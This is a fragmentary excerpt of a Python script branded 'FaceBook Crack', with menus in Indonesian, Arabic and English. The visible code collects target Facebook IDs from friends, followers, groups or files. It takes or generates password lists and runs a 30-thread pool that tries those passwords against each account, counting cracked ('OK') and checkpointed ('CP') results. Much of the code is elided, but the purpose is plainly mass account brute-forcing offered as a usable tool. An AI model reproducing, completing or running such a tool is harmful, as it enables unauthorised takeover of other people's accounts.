...
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	print(f'{b}\tFaceBook Crack')
#  print(f'\t THE MEMEKERS ')
	print(f'\tTelegram > @MM88X ')
	print(f'\tInstagram > @66pps ')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_bas():
	try:
		...
		print(f'%s[%sx%s]%s LOGIN Bad !%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(bas_id):
	try:
...
# print(f'>> Github   : {gh}')
	print('')
	print(' - 1 - Crack Frind : من الاصدقاء ')
...
#	print('├──> 5. Hasil Crack  ')
	...
	if _____alvino__adijaya_____ in ['1']:
		dump_massal()
	elif _____alvino__adijaya_____ in ['24']:
		dump_follower()
	elif _____alvino__adijaya_____ in ['34']:
		grup()
	elif _____alvino__adijaya_____ in ['44']:
		crack_file()
	elif _____alvino__adijaya_____ in ['54']:
		result()
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input(' - number of targets عدد المستهدفين ? : '))
	except ValueError:
		print('├──> ID :  ')
		exit()
	if jum<1 or jum>100:
	...
	try:
		...
		print(f'├──>{k} id Public {b}')
		time.sleep(3)
		back()

#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{b}1. Account Old ')
	print('2. Account New ')
	print('3. Random : افضل')
	hu = input('├──> chose : ')
	if hu in ['1','01']:
...
# print('')
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	_jembot_ = input('Show associated applications : عرض التطبيقات المرتبطه  \n1 - yes \n2 - no \n')
	if _jembot_ in ['']:
		print('├──> chose ')
		back()
		...
		taplikasi.append('2')
	pwplus=input('Password \n- 1- password From you باسورد منك \n- 2 - password from tool : باسورد من الاداه\n ( \n chose : ')
	if pwplus in ['1','01']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]]   Minimal 6 \n'))
		pwku=input('├──>  Password  : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'├──> {b}•{b}•{b}•{b} Sedang Orang {b}•{b}•{b}•{b} <<<<< ')
	print('')
	print(f'├──>  {h}OK{b} : {h}OK/%s {b}'%(okc))
	print(f'├──>  {k}CP{b} : {k}CP/%s {b}'%(cpc))
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] Crack ✓[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {b}%s{x} '%(cp))
	print('')
	print('├──> Ran agian Crack ( Y/t ) ? ')
	woi = input('├──> chose : ')
	if woi in ['y','Y']:
		back()
	else:
